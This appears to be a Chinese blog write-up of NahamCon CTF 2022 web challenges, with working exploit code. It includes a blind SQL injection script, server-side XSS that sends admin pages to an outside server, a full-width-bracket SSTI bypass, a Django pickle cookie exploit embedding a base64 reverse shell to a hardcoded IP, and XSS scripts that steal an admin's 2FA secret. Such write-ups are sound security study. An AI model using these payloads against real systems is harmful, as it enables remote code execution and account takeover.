@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="NahamCon CTF 2022">
+<meta property="og:url" content="http://example.com/2022/05/02/nactf/index.html">
+<meta property="og:site_name" content="Y0ng的博客">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTF640">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220430132042077.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220430132134214.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220430132216613.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220430132404766.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502132647343.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502132828575.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502151135923.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502152458573.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502153314095.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502161048074.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502162755447.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502202726900.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502202942629.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502204839081.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502210127683.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502211534718.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502212818125.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502212855027.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502220439862.png">
+<meta property="article:published_time" content="2022-05-02T14:19:59.425Z">
+<meta property="article:modified_time" content="2022-05-02T14:19:38.615Z">
+<meta property="article:author" content="Y0ng">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTF640">
+
+<link rel="canonical" href="http://example.com/2022/05/02/nactf/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>NahamCon CTF 2022 | Y0ng的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Y0ng的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">169</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/02/nactf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cys.jpg">
+      <meta itemprop="name" content="Y0ng">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          NahamCon CTF 2022
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-05-02 22:19:59 / 修改时间：22:19:38" itemprop="dateCreated datePublished" datetime="2022-05-02T22:19:59+08:00">2022-05-02</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%B5%9B%E9%A2%98wp/" itemprop="url" rel="index"><span itemprop="name">赛题wp</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTF640" alt="å¾ç"></p>
+<a id="more"></a>
+
+<h1 id="Flaskmetal-Alchemist"><a href="#Flaskmetal-Alchemist" class="headerlink" title="Flaskmetal Alchemist"></a>Flaskmetal Alchemist</h1><p>看一下依赖</p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220430132042077.png" alt="image-20220430132042077"></p>
+<p>看一下modules.py</p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220430132134214.png" alt="image-20220430132134214"></p>
+<p>flag在Flag中，看下主体逻辑</p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220430132216613.png" alt="image-20220430132216613"></p>
+<p>使用like与两个%包裹用户输入的数据，这里无法进行注入，往下看到有个order_by这里可控，确实存在注入</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/sqlalchemy/sqlalchemy/issues/4481#issuecomment-461204518">https://github.com/sqlalchemy/sqlalchemy/issues/4481#issuecomment-461204518</a></p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220430132404766.png" alt="image-20220430132404766"></p>
+<p>但是题目用的是sqlite，没有if，使用 <strong>case  when … then .. else .. end</strong></p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz1234567890&#123;&#125;_-[]()!~QWERTYUIOPASDFGHJKLZXCVBNM&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://challenge.nahamcon.com:30678/&quot;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line"> <span class="keyword">for</span> a <span class="keyword">in</span> s:</span><br><span class="line">    payload=<span class="string">&quot;case when(substr((select flag from Flag),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;) then randomblob(1) else 2 end limit 1,1&quot;</span>.<span class="built_in">format</span>(i,a)</span><br><span class="line">    data = &#123;<span class="string">&quot;search&quot;</span>:<span class="string">&quot;Li&quot;</span>,<span class="string">&quot;order&quot;</span>:payload&#125;</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Beryllium&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        flag+=a</span><br><span class="line">        print(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Hacker-Ts"><a href="#Hacker-Ts" class="headerlink" title="Hacker Ts"></a>Hacker Ts</h1><ul>
+<li>Server-Side-Xss</li>
+</ul>
+<blockquote>
+<p> We all love our hacker t-shirts. Make your own custom ones.</p>
+</blockquote>
+<p>功能点是用户输入文字，然后将文字生成图片”印”到T恤上。有”/admin”页面，但是无法访问</p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502132647343.png" alt="image-20220502132647343"></p>
+<p>此时的URL：http:// challenge.nahamcon.com:31762/exploit?text=test&amp;color=#24d600，产生的效果类似于生成了一个pdf，然后与衣服的图片叠加起来了</p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502132828575.png" alt="image-20220502132828575"></p>
+<p>对于text字段可以尝试输入html，看其变化  **&lt;script&gt;document.write(123)&lt;/script&gt;**，发现生成html页面，可以执行js，也就是说存在一个服务端xss</p>
+<ul>
+<li>Server Side XSS -&gt; <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf">Server Side XSS (Dynamic PDF) - HackTricks</a></li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502151135923.png" alt="image-20220502151135923"></p>
+<p>通过搜索了pdf的相关利用方式，基本上就是本地文件读取和ssrf，所以可以尝试利用本地文件读取</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    x&#x3D;new XMLHttpRequest;</span><br><span class="line">    x.onload&#x3D;function()&#123;  </span><br><span class="line">    document.write(this.responseText)</span><br><span class="line">&#125;;</span><br><span class="line">    x.open(&quot;GET&quot;,&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;);</span><br><span class="line">    x.send();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当执行时，爆了错误，看到使用了 wkhtmltoimage，佐证了上面的猜测，可能报错的原因查了一下，wkhtmltopdf,在0.12.6版本默认禁止读取本地文件</p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502152458573.png" alt="image-20220502152458573">切换攻击方式，我们可以利用 <strong>XMLHttpRequest</strong> 去让服务器访问/admin，然后将访问的内容返回到hacker的vps上</p>
+<p>将payload进行urlencode</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">x&#x3D;new XMLHttpRequest();</span><br><span class="line">x.open(&quot;GET&quot;,&quot;http:&#x2F;&#x2F;localhost:5000&#x2F;admin&quot;);</span><br><span class="line">x.onload&#x3D;function()&#123;var i &#x3D; new Image(); i.src &#x3D; &quot;https:&#x2F;&#x2F;&lt;vps&gt;&#x2F;?c&#x3D;&quot; + btoa(this.responseText)&#125;;</span><br><span class="line">x.send();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>关于XMLHttpRequest() <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/conflicting/Web/API/XMLHttpRequest/load_event">XMLHttpRequestEventTarget.onload | MDN (mozilla.org)</a></p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502153314095.png" alt="image-20220502153314095"></p>
+<p>页面回显了?C=xxxx</p>
+<p>FLAG：flag{461e2452088eb397b6138a5934af6231}</p>
+<h1 id="Deafcon"><a href="#Deafcon" class="headerlink" title="Deafcon"></a>Deafcon</h1><ul>
+<li>SSTI</li>
+<li>全半角绕过括号过滤</li>
+<li>mailto Xss</li>
+</ul>
+<blockquote>
+<p>Deafcon 2022 is finally here! Make sure you don’t miss it.</p>
+</blockquote>
+<p>功能点：输入用户名以及邮箱会生成一个pdf，对于PDF信息为： wkhtmltopdf 0.12.5</p>
+<p>对于用户名以及邮箱有着严格的过滤</p>
+<ul>
+<li>username：[a-zA-Z0-9_]</li>
+<li>email：符合RFC5322-compliant 以及 no parenthese</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502161048074.png" alt="image-20220502161048074"></p>
+<p>对于username来说，绕过基本是不可能的，所以在比赛的时候我就围绕email进行了测试，一开始我找到了关于email地方的xss</p>
+<p><a target="_blank" rel="noopener" href="https://infosecwriteups.com/intigriti-xss-challenge-0321-472ae0a48254">https://infosecwriteups.com/intigriti-xss-challenge-0321-472ae0a48254</a></p>
+<p>大概来说就是，关于a标签，插入正常的email为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;mailto:a@b.com&quot;&gt;a@b.com&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这会指向<a href="mailto:&#97;&#64;&#x62;&#x2e;&#99;&#111;&#109;">&#97;&#64;&#x62;&#x2e;&#99;&#111;&#109;</a>的邮箱，我们根据RFC5322的规范 <code>@</code>符号前可以加上 <code>&quot;</code> 也就是说<code>&quot;a&quot;@b.com</code>，如果我们加上payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;onmousemove&#x3D;alert(1);&quot;@evil.com</span><br></pre></td></tr></table></figure>
+
+<p>也就导致了这样的xss</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;mailto:&quot; onmousemove&#x3D;&quot;alert(1);&quot;@evil.com&quot;&quot;&gt;&quot;onmousemove&#x3D;alert(1);&quot;@evil.com&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 成功执行js</p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502162755447.png" alt="image-20220502162755447"></p>
+<p>搭配着pdf进行xss进而ssrf或者读文件岂不是轻轻松松拿下？事实就是，太年轻了，找不到利用点，准确来说找不到a标签的利用点，上面是利用鼠标移动触发的xss，现在的情况是生成pdf，无法利用，对于js缺少相关知识，没有找到利用点。</p>
+<p>根据 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/2049502/what-characters-are-allowed-in-an-email-address">表单 - 电子邮件地址中允许使用哪些字符？- 堆栈溢出 (stackoverflow.com)</a></p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502202726900.png" alt="image-20220502202726900"></p>
+<p>我们可以尝试下SSTI，因为网站风格确实有点像python的风格，所以我尝试了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&#123;&#123;7*7&#125;&#125;&quot;@qq.com</span><br><span class="line">&#123;&#123; self._TemplateReference__context.cycler.__init__.__globals__.os.popen(&#39;id&#39;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502202942629.png" alt="image-20220502202942629"></p>
+<p>SSTI的payload打过去发现过滤了<code>()</code> </p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502204839081.png" alt="image-20220502204839081"></p>
+<p>这SSTI中哪个payload不用括号？然后就G了</p>
+<p>WP：</p>
+<p>利用 <strong>全角括号</strong> 进行绕过，在这份报告中 <a target="_blank" rel="noopener" href="https://hackerone.com/reports/639684">The return of the ＜ (hackerone.com)</a>，研究人员输入全角字母，然后经过规范化后转为半角</p>
+<p><a target="_blank" rel="noopener" href="https://graphemica.com/%EF%BC%88">（ | 全角左括号</a> 、<a target="_blank" rel="noopener" href="https://graphemica.com/%EF%BC%89">） | 全角右括号</a></p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&#123;&#123; self._TemplateReference__context.cycler.__init__.__globals__.os.popen（&#39;id&#39;）.read（） &#125;&#125;&quot;@qq.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502210127683.png" alt="image-20220502210127683"></p>
+<p>FLAG：flag{001a305ac5ab4b4ea995e5719ab10104}</p>
+<h1 id="Poller"><a href="#Poller" class="headerlink" title="Poller"></a>Poller</h1><ul>
+<li>Django</li>
+<li>PickleSerializer</li>
+<li>pickle反序列化</li>
+</ul>
+<blockquote>
+<p>Have your say! Poller is the place where all the important infosec questions are asked.</p>
+</blockquote>
+<p>网站框架为Django，正常注册登录后发现有三个投票</p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502211534718.png" alt="image-20220502211534718"></p>
+<p>在html页面发现了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- https:&#x2F;&#x2F;github.com&#x2F;congon4tor&#x2F;poller --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>看了下github的记录，删除了默认的 key</p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502212818125.png" alt="image-20220502212818125"></p>
+<p>但是 .env文件又被推了上去，所以说还是得到了key</p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502212855027.png" alt="image-20220502212855027"></p>
+<p>搜索得到文章 django使用</p>
+<blockquote>
+<p>在花了一些时间在谷歌上搜索利用密钥的方法后，我发现这个应用程序正在使用基于cookie的会话和个性化的PickleSerializer。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://chiko360.medium.com/some-ingehack-ctf-2021-writeups-c1c767dc6736">一些IngeHack CTF 2021文章</a></p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> django.core.signing</span><br><span class="line"><span class="keyword">from</span> pyspark.serializers <span class="keyword">import</span> PickleSerializer</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line">os.environ.setdefault(<span class="string">&quot;DJANGO_SETTINGS_MODULE&quot;</span>, <span class="string">&quot;config.settings.production&quot;</span>)</span><br><span class="line">SECRET_KEY = <span class="string">&quot;77m6p#v&amp;(wk_s2+n5na-bqe!m)^zu)9typ#0c&amp;@qd%8o6!&quot;</span> <span class="comment"># from .env</span></span><br><span class="line">payload = <span class="string">&#x27;getattr(__import__(&quot;os&quot;), &quot;system&quot;)(&quot;echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMS4xMTYuMTEwLjYxIiwzMDAwKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiL2Jpbi9zaCIpJwo= | base64 -d | sh&quot;)&#x27;</span> <span class="comment"># change this</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PickleRce</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (builtins.<span class="built_in">eval</span>, (payload,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookie = PickleRce()</span><br><span class="line">signed_cookie = django.core.signing.dumps(cookie, key=SECRET_KEY, serializer=PickleSerializer,</span><br><span class="line">                                          salt=<span class="string">&#x27;django.contrib.sessions.backends.signed_cookies&#x27;</span>, compress=<span class="literal">True</span>)</span><br><span class="line">print(signed_cookie)</span><br></pre></td></tr></table></figure>
+
+<p>环境问题没能成功</p>
+<h1 id="Two-For-One"><a href="#Two-For-One" class="headerlink" title="Two For One"></a>Two For One</h1><ul>
+<li>Blind Xss</li>
+<li>Xss盲打</li>
+</ul>
+<p>虚空复现一下，注册用户后需要Google Authenticator来扫一下QR，好吧，还得费劲下载，摆了</p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/nahamconCTFimage-20220502220439862.png" alt="image-20220502220439862"></p>
+<p>题目要求是以管理员用户登录，在 “Feedback” 页面直接插入xss</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;&lt;myserver&gt;&#x2F;?hello-from-img-tag&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>收到请求</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;GET &#x2F;?hello-from-img-tag HTTP&#x2F;1.1&quot; 200 0 &quot;http:&#x2F;&#x2F;localhost:5000&#x2F;feedback&#x2F;1&quot; &quot;Mozilla&#x2F;5.0 (X11; Linux x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) HeadlessChrome&#x2F;81.0.4044.113 Safari&#x2F;537.36&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后去获取了管理员的OTP</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">setTimeout(reset2fa, 5000);</span><br><span class="line"></span><br><span class="line">function reset2fa() &#123;</span><br><span class="line">    fetch(&quot;&#x2F;reset2fa&quot;, &#123;</span><br><span class="line">        method: &quot;POST&quot;,</span><br><span class="line">        headers: &#123;</span><br><span class="line">            &#39;Accept&#39;: &#39;application&#x2F;json&#39;,</span><br><span class="line">            &#39;Content-Type&#39;: &#39;application&#x2F;json&#39;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).then(res &#x3D;&gt; &#123;</span><br><span class="line">        res.json().then((json) &#x3D;&gt; &#123;</span><br><span class="line">            var i &#x3D; new Image(1, 1);</span><br><span class="line">            i.src &#x3D; &quot;https:&#x2F;&#x2F;&lt;myserver&gt;&#x2F;?otp&#x3D;&quot; + btoa(json.url);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>获得管理员的OTP</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">otpauth:&#x2F;&#x2F;totp&#x2F;Fort%20Knox:admin?secret&#x3D;4LD5HQA4HVJGQPDV&amp;issuer&#x3D;Fort%20Knox</span><br></pre></td></tr></table></figure>
+
+<p>然后重置管理员密码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">setTimeout(reset_password, 5000);</span><br><span class="line"></span><br><span class="line">function reset_password() &#123;</span><br><span class="line">    data &#x3D; &#123;</span><br><span class="line">      &quot;otp&quot;: &quot;&lt;admin OTP&gt;&quot;,  &#x2F;&#x2F; change this</span><br><span class="line">      &quot;password&quot;: &quot;hoge&quot;,</span><br><span class="line">      &quot;password2&quot;: &quot;hoge&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fetch(&quot;&#x2F;reset_password&quot;, &#123;</span><br><span class="line">      method: &quot;POST&quot;,</span><br><span class="line">      headers: &#123;</span><br><span class="line">        &#39;Accept&#39;: &#39;application&#x2F;json&#39;,</span><br><span class="line">        &#39;Content-Type&#39;: &#39;application&#x2F;json&#39;</span><br><span class="line">      &#125;,</span><br><span class="line">      body: JSON.stringify(data)</span><br><span class="line">    &#125;).then(res &#x3D;&gt; &#123;</span><br><span class="line">        var i &#x3D; new Image(1, 1);</span><br><span class="line">        i.src &#x3D; &quot;https:&#x2F;&#x2F;&lt;myserver&gt;&#x2F;?message&#x3D;password_change_done&quot;;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/04/26/%E7%BD%91%E5%88%83/" rel="prev" title="第二届网刃杯 WEB">
+      <i class="fa fa-chevron-left"></i> 第二届网刃杯 WEB
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
